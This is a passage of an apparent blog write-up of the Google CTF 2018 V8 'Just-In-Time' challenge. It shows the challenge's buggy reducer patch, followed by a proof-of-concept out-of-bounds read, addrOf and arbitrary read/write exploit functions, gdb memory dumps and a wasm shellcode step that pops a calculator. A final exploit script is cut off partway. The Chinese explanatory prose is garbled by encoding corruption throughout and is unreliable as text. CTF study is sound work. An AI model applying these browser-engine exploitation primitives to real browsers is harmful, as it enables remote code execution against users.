class="line"><span class="addition">+#include &quot;src/compiler/graph.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/compiler/node-properties.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace v8 &#123;</span></span><br><span class="line"><span class="addition">+namespace internal &#123;</span></span><br><span class="line"><span class="addition">+namespace compiler &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph,</span></span><br><span class="line"><span class="addition">+                     CommonOperatorBuilder* common)</span></span><br><span class="line"><span class="addition">+    : AdvancedReducer(editor),</span></span><br><span class="line"><span class="addition">+      graph_(graph), common_(common) &#123;&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;</span></span><br><span class="line"><span class="addition">+  switch (node-&gt;opcode()) &#123;</span></span><br><span class="line"><span class="addition">+    case IrOpcode::kNumberAdd:</span></span><br><span class="line"><span class="addition">+      return ReduceAddition(node);</span></span><br><span class="line"><span class="addition">+    default:</span></span><br><span class="line"><span class="addition">+      return NoChange();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) &#123;</span></span><br><span class="line"><span class="addition">+  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);</span></span><br><span class="line"><span class="addition">+  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);</span></span><br><span class="line"><span class="addition">+  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Node* left = NodeProperties::GetValueInput(node, 0);</span></span><br><span class="line"><span class="addition">+  if (left-&gt;opcode() != node-&gt;opcode()) &#123;</span></span><br><span class="line"><span class="addition">+    return NoChange();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Node* right = NodeProperties::GetValueInput(node, 1);</span></span><br><span class="line"><span class="addition">+  if (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span></span><br><span class="line"><span class="addition">+    return NoChange();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Node* parent_left = NodeProperties::GetValueInput(left, 0);</span></span><br><span class="line"><span class="addition">+  Node* parent_right = NodeProperties::GetValueInput(left, 1);</span></span><br><span class="line"><span class="addition">+  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span></span><br><span class="line"><span class="addition">+    return NoChange();</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  double const1 = OpParameter&lt;double&gt;(right-&gt;op());</span></span><br><span class="line"><span class="addition">+  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());</span></span><br><span class="line"><span class="addition">+  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  NodeProperties::ReplaceValueInput(node, parent_left, 0);</span></span><br><span class="line"><span class="addition">+  NodeProperties::ReplaceValueInput(node, new_const, 1);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return Changed(node);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace compiler</span></span><br><span class="line"><span class="addition">+&#125;  // namespace internal</span></span><br><span class="line"><span class="addition">+&#125;  // namespace v8</span></span><br><span class="line"><span class="comment">diff --git a/src/compiler/duplicate-addition-reducer.h b/src/compiler/duplicate-addition-reducer.h</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 0000000000..7285f1ae3e</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/duplicate-addition-reducer.h</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,60 @@</span></span><br><span class="line"><span class="addition">+/*</span></span><br><span class="line"><span class="addition">+ * Copyright 2018 Google LLC</span></span><br><span class="line"><span class="addition">+ *</span></span><br><span class="line"><span class="addition">+ * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="addition">+ * you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="addition">+ * You may obtain a copy of the License at</span></span><br><span class="line"><span class="addition">+ *</span></span><br><span class="line"><span class="addition">+ *      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="addition">+ *</span></span><br><span class="line"><span class="addition">+ * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="addition">+ * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="addition">+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="addition">+ * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="addition">+ * limitations under the License.</span></span><br><span class="line"><span class="addition">+ */</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#ifndef V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span></span><br><span class="line"><span class="addition">+#define V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/base/compiler-specific.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/compiler/graph-reducer.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/globals.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/machine-type.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace v8 &#123;</span></span><br><span class="line"><span class="addition">+namespace internal &#123;</span></span><br><span class="line"><span class="addition">+namespace compiler &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Forward declarations.</span></span><br><span class="line"><span class="addition">+class CommonOperatorBuilder;</span></span><br><span class="line"><span class="addition">+class Graph;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+class V8_EXPORT_PRIVATE DuplicateAdditionReducer final</span></span><br><span class="line"><span class="addition">+    : public NON_EXPORTED_BASE(AdvancedReducer) &#123;</span></span><br><span class="line"><span class="addition">+ public:</span></span><br><span class="line"><span class="addition">+  DuplicateAdditionReducer(Editor* editor, Graph* graph,</span></span><br><span class="line"><span class="addition">+                      CommonOperatorBuilder* common);</span></span><br><span class="line"><span class="addition">+  ~DuplicateAdditionReducer() final &#123;&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  const char* reducer_name() const override &#123; return &quot;DuplicateAdditionReducer&quot;; &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Reduction Reduce(Node* node) final;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+ private:</span></span><br><span class="line"><span class="addition">+  Reduction ReduceAddition(Node* node);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Graph* graph() const &#123; return graph_;&#125;</span></span><br><span class="line"><span class="addition">+  CommonOperatorBuilder* common() const &#123; return common_; &#125;;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Graph* const graph_;</span></span><br><span class="line"><span class="addition">+  CommonOperatorBuilder* const common_;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DISALLOW_COPY_AND_ASSIGN(DuplicateAdditionReducer);</span></span><br><span class="line"><span class="addition">+&#125;;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace compiler</span></span><br><span class="line"><span class="addition">+&#125;  // namespace internal</span></span><br><span class="line"><span class="addition">+&#125;  // namespace v8</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#endif  // V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span></span><br><span class="line"><span class="comment">diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.cc</span></span><br><span class="line"><span class="comment">index 5717c70348..8cca161ad5 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/pipeline.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/pipeline.cc</span></span><br><span class="line"><span class="meta">@@ -27,6 +27,7 @@</span></span><br><span class="line"> #include &quot;src/compiler/constant-folding-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/control-flow-optimizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/dead-code-elimination.h&quot;</span><br><span class="line"><span class="addition">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span></span><br><span class="line"> #include &quot;src/compiler/effect-control-linearizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis.h&quot;</span><br><span class="line"><span class="meta">@@ -1301,6 +1302,8 @@</span> struct TypedLoweringPhase &#123;</span><br><span class="line">                                data-&gt;jsgraph()-&gt;Dead());</span><br><span class="line">     DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">                                               data-&gt;common(), temp_zone);</span><br><span class="line"><span class="addition">+    DuplicateAdditionReducer duplicate_addition_reducer(&amp;graph_reducer, data-&gt;graph(),</span></span><br><span class="line"><span class="addition">+                                              data-&gt;common());</span></span><br><span class="line">     JSCreateLowering create_lowering(&amp;graph_reducer, data-&gt;dependencies(),</span><br><span class="line">                                      data-&gt;jsgraph(), data-&gt;js_heap_broker(),</span><br><span class="line">                                      data-&gt;native_context(), temp_zone);</span><br><span class="line"><span class="meta">@@ -1318,6 +1321,7 @@</span> struct TypedLoweringPhase &#123;</span><br><span class="line">                                          data-&gt;js_heap_broker(), data-&gt;common(),</span><br><span class="line">                                          data-&gt;machine(), temp_zone);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line"><span class="addition">+    AddReducer(data, &amp;graph_reducer, &amp;duplicate_addition_reducer);</span></span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;create_lowering);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;typed_optimization);</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¼¼æ²’å•é¡Œï¼Œä½†åœ¨ V8 ä¸­æµ®é»æ•¸æ˜¯ç”¨ IEEE 754 è¡¨ç¤ºçš„ï¼Œå¤§æ–¼ Number.MAX_SAFE_INTEGEER åœ¨è¨ˆç®—æ™‚å¯èƒ½æœƒå‡ºç¾å•é¡Œ<br>ä¾†å€‹ä¾‹å­<br><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/poc.png"><br>ç”±æ–¼ç¯€é»çš„è³‡æ–™ç¯„åœæ˜¯åœ¨ typer phase è¨ˆç®—çš„ï¼Œè€Œ duplicate_addition_reducer æ˜¯åœ¨ typer phase ä¹‹å¾Œçš„ typed lowering phase è¢«åŸ·è¡Œçš„ï¼Œä¸” duplicate_addition_reducer ä¸æœƒæ›´æ–°ç¯€é»çš„ç¯„åœï¼Œå¯ä»¥åˆ©ç”¨é€™å€‹æ©Ÿåˆ¶é€²è¡Œ oob è®€å¯«</p>
<h4 id="typer-phase"><a href="#typer-phase" class="headerlink" title="typer phase"></a>typer phase</h4><p><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/typer.png"></p>
<h4 id="typed-lowering-phase"><a href="#typed-lowering-phase" class="headerlink" title="typed lowering phase"></a>typed lowering phase</h4><p><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/lowering.png"></p>
<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">poc</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>];</span><br><span class="line">    <span class="keyword">let</span> x = a == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">    x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    x -= <span class="number">9007199254740991</span>; <span class="comment">//Range(0, 1), but actually Range(0, 3)</span></span><br><span class="line">    <span class="keyword">return</span> double_arr[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">    <span class="title function_">poc</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">poc</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸè¶Šç•Œè®€å–<br><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/oob.png"></p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="addrOf-primitive"><a href="#addrOf-primitive" class="headerlink" title="addrOf primitive"></a>addrOf primitive</h3><p>åˆ©ç”¨ä¹˜æ³•å¯ä»¥æ“´å¤§è®€å–ç¯„åœ<br>å¯ä»¥èª¿ä¸€ä¸‹ index è®“ double_arr è®€å–åˆ° obj_arr çš„ elementsï¼Œé€™æ¨£å°±èƒ½ leak address<br><code>%DebugPrint()</code> ä¼¼ä¹æœƒå½±éŸ¿å…§å­˜å¸ƒå±€ï¼Œé€™é‚Šæˆ‘ç”¨ â€“print-code é¸é …è®“ä»–å°å‡ºç·¨è­¯å¥½çš„ assemblyï¼Œæ‰¾åˆ° double_arr è¼‰å…¥ elements çš„åœ°æ–¹ä¸‹æ–·é»ï¼Œé€™æ¨£å°±èƒ½æ‰¾åˆ° elements çš„ä½ç½®ï¼Œobj_arr æ‡‰è©²åœ¨ double_arr ä¸‹é¢ä¸€é»çš„ä½ç½®ï¼Œæ…¢æ…¢ ni ç„¶å¾Œçœ‹å…§å­˜å¯ä»¥æ‰¾åˆ° element_arr çš„ elementï¼Œè¨ˆç®— offset å°±å¯ä»¥æ‰¾åˆ°æ­£ç¢ºçš„ index äº†</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">trigger, idx, obj</span>)&#123;</span><br><span class="line">	<span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>, <span class="number">1.7</span>, <span class="number">1.8</span>, <span class="number">1.9</span>];</span><br><span class="line">	<span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">	<span class="keyword">let</span> x = trigger == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">	x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">	x -= <span class="number">9007199254740991</span>;</span><br><span class="line">	x *= <span class="number">6</span>;</span><br><span class="line">	obj_arr[idx] = obj; <span class="comment">// prevent obj_arr be optimized away</span></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">ftoa</span>(double_arr[x]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fakeObj-primitive"><a href="#fakeObj-primitive" class="headerlink" title="fakeObj primitive"></a>fakeObj primitive</h3><p>æ¥ä¸‹ä¾†å˜—è©¦ç”¨ oob è®€å– double_arr çš„ mapï¼Œä½†å¤±æ•—äº†<br>æœ‰è®€åˆ°çœ‹èµ·ä¾†å¾ˆåƒçš„æ±è¥¿ï¼Œä½†åœ¨å¾ŒçºŒæ§‹é€  arbitrary read&#x2F;write çš„æ™‚å€™å¤±æ•—äº†ï¼Œæˆ‘æ‰¾ä¸åˆ°åŸå› æ‰€ä»¥æ›å€‹æ–¹æ³•</p>
<h3 id="arbitrary-read-write-primitive"><a href="#arbitrary-read-write-primitive" class="headerlink" title="arbitrary read&#x2F;write primitive"></a>arbitrary read&#x2F;write primitive</h3><p>å˜—è©¦å®£å‘Šä¸€å€‹ ArrayBuffer ä¸¦åœ¨å‡½æ•¸å…§éƒ¨å®£å‘Šä¸€å€‹ Float64Arrayï¼Œå˜—è©¦æ‰¾åˆ° Float64Array å­˜è³‡æ–™çš„ pointer<br>è·Ÿå‰é¢ä¸€æ¨£åœ¨ double_arr è¼‰å…¥ elements çš„ä½ç½®ä¸‹æ–·é»</p>
<p>åœ¨ä¸‹é¢ä¸€é»çš„åœ°æ–¹æ‡‰è©²æœ‰é€™æ¨£çš„ codeï¼Œé€™é‚Šæ˜¯å®£å‘Š Float64Array çš„åœ°æ–¹ï¼ŒæŠŠæ–·é»ä¸‹åœ¨ <code>call r10</code> å¾Œé¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x2879719c5ce3   123  48b90122804a61180000 REX.W movq rcx,0x18614a802201    ;; object: 0x18614a802201 &lt;ArrayBuffer map = 0x34559a284aa1&gt;</span><br><span class="line">0x2879719c5ced   12d  488b75c8       REX.W movq rsi,[rbp-0x38]</span><br><span class="line">0x2879719c5cf1   131  48b8594491476e380000 REX.W movq rax,0x386e47914459    ;; object: 0x386e47914459 &lt;JSFunction Float64Array (sfi = 0xf1f45795eb9)&gt;</span><br><span class="line">0x2879719c5cfb   13b  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x1e7f916825b1 &lt;undefined&gt;))</span><br><span class="line">0x2879719c5cff   13f  488bd8         REX.W movq rbx,rax</span><br><span class="line">0x2879719c5d02   142  488bfa         REX.W movq rdi,rdx</span><br><span class="line">0x2879719c5d05   145  49ba803f11c9ae550000 REX.W movq r10,0x55aec9113f80  (CreateTypedArray)</span><br><span class="line">0x2879719c5d0f   14f  41ffd2         call r10</span><br></pre></td></tr></table></figure>
<p>ä¸‹ <code>c</code> æ‰¾åˆ° double_arr çš„ elements ä¹‹å¾Œä¸‹ <code>c</code>ï¼Œdouble_array å¾Œé¢æ‡‰è©²æœƒæœ‰ Float64Arrayï¼Œæ‰¾åˆ°æŒ‡å‘ buffer çš„ pointer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  x/32gx 0x367469ba1c41-1</span><br><span class="line">0x367469ba1c40:	0x00001e7f91683539	0x0000000900000000</span><br><span class="line">0x367469ba1c50:	0x3ff199999999999a	0x3ff3333333333333</span><br><span class="line">0x367469ba1c60:	0x3ff4cccccccccccd	0x3ff6666666666666</span><br><span class="line">0x367469ba1c70:	0x3ff8000000000000	0x3ff999999999999a</span><br><span class="line">0x367469ba1c80:	0x3ffb333333333333	0x3ffccccccccccccd</span><br><span class="line">0x367469ba1c90:	0x3ffe666666666666	0x000034559a284c81</span><br><span class="line">0x367469ba1ca0:	0x00001e7f91682d29	0x0000367469ba1ce1</span><br><span class="line">0x367469ba1cb0:	0x000018614a802201	0x0000000000000000</span><br><span class="line">0x367469ba1cc0:	0x0000010000000000	0x0000002000000000</span><br><span class="line">0x367469ba1cd0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x367469ba1ce0:	0x00001e7f916845c9	0x0000002000000000</span><br><span class="line">0x367469ba1cf0:	0x0000000000000000	0x000055aeca03d1f0</span><br><span class="line">0x367469ba1d00:	0x00001e7f91683539	0x0000000900000000</span><br><span class="line">0x367469ba1d10:	0x0000000000000000	0x3ff3333333333333</span><br><span class="line">0x367469ba1d20:	0x3ff4cccccccccccd	0x3ff6666666666666</span><br><span class="line">0x367469ba1d30:	0x3ff8000000000000	0x3ff999999999999a</span><br><span class="line"></span><br><span class="line">gefâ¤  job 0x367469ba1c99</span><br><span class="line">0x367469ba1c99: [JSTypedArray]</span><br><span class="line"> - map: 0x34559a284c81 &lt;Map(FLOAT64_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x386e47914559 &lt;Object map = 0x34559a284cd1&gt;</span><br><span class="line"> - elements: 0x367469ba1ce1 &lt;FixedFloat64Array[32]&gt; [FLOAT64_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer: 0x18614a802201 &lt;ArrayBuffer map = 0x34559a284aa1&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 256</span><br><span class="line"> - length: 32</span><br><span class="line"> - properties: 0x1e7f91682d29 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - elements: 0x367469ba1ce1 &lt;FixedFloat64Array[32]&gt; &#123;</span><br><span class="line">        0-31: 0</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    (nil)</span><br><span class="line">    (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>ä½† 0x18614a802201 æ˜¯å€‹ objectï¼ŒçœŸæ­£å­˜è³‡æ–™çš„åœ°æ–¹æ˜¯åœ¨ <code>0x000055aeca03d1f0</code> é€™è£¡ï¼Œé€™æ˜¯ä¸€å€‹ heap ä¸Šçš„ä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  telescope 0x18614a802201-1</span><br><span class="line">0x000018614a802200â”‚+0x0000: 0x000034559a284aa1  â†’  0x0800001e7f916822</span><br><span class="line">0x000018614a802208â”‚+0x0008: 0x00001e7f91682d29  â†’  0x0000001e7f916828</span><br><span class="line">0x000018614a802210â”‚+0x0010: 0x00001e7f91682d29  â†’  0x0000001e7f916828</span><br><span class="line">0x000018614a802218â”‚+0x0018: 0x0000010000000000</span><br><span class="line">0x000018614a802220â”‚+0x0020: 0x000055aeca03d1f0  â†’  0x0000000000000000</span><br><span class="line">0x000018614a802228â”‚+0x0028: 0x0000000000000004</span><br><span class="line">0x000018614a802230â”‚+0x0030: 0x0000000000000000</span><br><span class="line">0x000018614a802238â”‚+0x0038: 0x0000000000000000</span><br><span class="line">0x000018614a802240â”‚+0x0040: 0x00001e7f916833f9  â†’  0x0000001e7f916822</span><br><span class="line">0x000018614a802248â”‚+0x0048: 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>è€Œé€™å€‹æ±è¥¿ä¹Ÿåœ¨ double_arr çš„é™„è¿‘ï¼Œå¯ä»¥ç”¨ oob æ”¹æˆæˆ‘å€‘è¦æ“ä½œçš„åœ°å€ä¸¦å›å‚³ä¸€å€‹æ–°çš„ Float64Arrayï¼Œé€™æ¨£å°±æœ‰ä»»æ„ä½ç½®è®€å¯«äº†</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rw_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">trigger, idx, addr</span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>, <span class="number">1.7</span>, <span class="number">1.8</span>, <span class="number">1.9</span>];</span><br><span class="line">	<span class="keyword">let</span> result = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(rw_buffer);</span><br><span class="line">	<span class="keyword">let</span> x = trigger == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">	x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">	x -= <span class="number">9007199254740991</span>;</span><br><span class="line">	x *= <span class="number">7</span>;</span><br><span class="line">	trigger = result[idx];</span><br><span class="line">	double_arr[x] = <span class="title function_">itof</span>(addr);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é€é-wasm-å¯«å…¥-shellcode"><a href="#é€é-wasm-å¯«å…¥-shellcode" class="headerlink" title="é€é wasm å¯«å…¥ shellcode"></a>é€é wasm å¯«å…¥ shellcode</h3><p>å¾ŒçºŒåˆ©ç”¨å°±å¾ˆç°¡å–®äº†ï¼Œé€éä»»æ„å¯«ç«„æ”¹ wasm çš„å…§å®¹å°±å¯ä»¥äº†</p>
<p>æˆåŠŸå½ˆå‡ºè¨ˆç®—æ©Ÿ<br><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/result.png"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> bigUnit64 = <span class="keyword">new</span> <span class="title class_">BigInt64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	